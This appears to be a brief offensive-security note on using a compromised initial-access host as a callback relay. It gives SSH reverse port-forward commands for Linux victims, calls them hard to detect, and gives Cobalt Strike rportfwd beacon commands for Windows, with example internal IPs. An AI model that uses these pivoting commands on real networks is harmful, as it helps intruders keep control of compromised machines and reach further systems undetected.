

When the IA is hacked, its good to use it as a callback host 


# Linux IA

if the IA is a linux machine then getting a portfoward up (alongside a pivot) is essentially

you can use SSH which is easier and its not really detectable




### Insert image of the linux acting as a callback host



```python
ssh -N -R IA_VICTIM:6969:YOUR_MACHINE:6969 root@IA_VICTIM 
```

Example;

```python
ssh -N -R 10.8.0.4:6969:10.8.0.3:6969 root@10.8.0.4
```



# Windows IA

doing this is done through cobalt strike usually


```python
rportfwd [bind port] [forward host] [forward port]
```

beacon on 10.8.0.4; 10.8.0.3 is me

```python
rportfwd 6969 10.8.0.3 6969
```

```python
rportfwd stop [bind port] - Use to disable the reverse port forward.
```


### Debugging

use the weblog